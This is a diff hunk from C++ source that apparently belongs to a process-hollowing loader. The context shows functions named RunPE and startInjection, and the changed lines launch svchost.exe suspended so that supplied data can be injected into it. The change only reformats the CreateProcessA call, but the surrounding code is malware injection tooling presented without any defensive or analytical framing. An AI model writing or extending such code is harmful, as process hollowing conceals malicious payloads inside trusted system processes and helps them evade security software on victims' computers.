@@ -135,7 +135,16 @@ bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
 void startInjection(unsigned char data[], unsigned int data_len) {
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi;
-    if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
+    if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", 
+        nullptr, 
+        nullptr, 
+        nullptr, 
+        FALSE, 
+        CREATE_SUSPENDED, 
+        nullptr, 
+        nullptr, 
+        &si, 
+        &pi)){
         cerr << "[error] Failed to create target process. Error: " << GetLastError() << "\n";
     }
 
